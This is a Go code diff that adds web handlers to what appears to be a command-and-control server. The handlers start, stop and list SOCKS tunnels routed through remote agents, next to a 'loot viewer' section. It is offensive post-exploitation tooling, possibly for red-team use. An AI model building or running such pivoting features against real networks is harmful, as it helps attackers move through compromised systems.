@@ -12,6 +12,66 @@ import (
 )
 
 // ══════════════════════════════════════════
+//  SOCKS TUNNEL (C2-side)
+// ══════════════════════════════════════════
+
+func (w *WebUI) handleTunnelStart(rw http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(rw, "POST required", 405)
+		return
+	}
+	var req struct {
+		Agent string `json:"agent"`
+		Bind  string `json:"bind"`
+	}
+	json.NewDecoder(r.Body).Decode(&req)
+
+	if req.Agent == "" {
+		writeJSON(rw, map[string]string{"error": "agent required"})
+		return
+	}
+
+	agent, _ := w.server.AgentMgr.Get(req.Agent)
+	if agent == nil {
+		writeJSON(rw, map[string]string{"error": "agent not found"})
+		return
+	}
+
+	msg, err := w.server.TunnelMgr.StartSOCKSTunnel(w.server, agent.ID, agent.Name, req.Bind)
+	if err != nil {
+		writeJSON(rw, map[string]string{"error": err.Error()})
+		return
+	}
+	writeJSON(rw, map[string]string{"status": "started", "message": msg})
+}
+
+func (w *WebUI) handleTunnelStop(rw http.ResponseWriter, r *http.Request) {
+	agentRef := r.URL.Query().Get("agent")
+	if agentRef == "" {
+		writeJSON(rw, map[string]string{"error": "agent required"})
+		return
+	}
+	agent, _ := w.server.AgentMgr.Get(agentRef)
+	if agent == nil {
+		writeJSON(rw, map[string]string{"error": "agent not found"})
+		return
+	}
+	if err := w.server.TunnelMgr.StopSOCKSTunnel(agent.ID); err != nil {
+		writeJSON(rw, map[string]string{"error": err.Error()})
+		return
+	}
+	writeJSON(rw, map[string]string{"status": "stopped"})
+}
+
+func (w *WebUI) handleTunnelList(rw http.ResponseWriter, r *http.Request) {
+	tunnels := w.server.TunnelMgr.ListTunnels()
+	if tunnels == nil {
+		tunnels = []map[string]string{}
+	}
+	writeJSON(rw, tunnels)
+}
+
+// ══════════════════════════════════════════
 //  LOOT VIEWER
 // ══════════════════════════════════════════
 
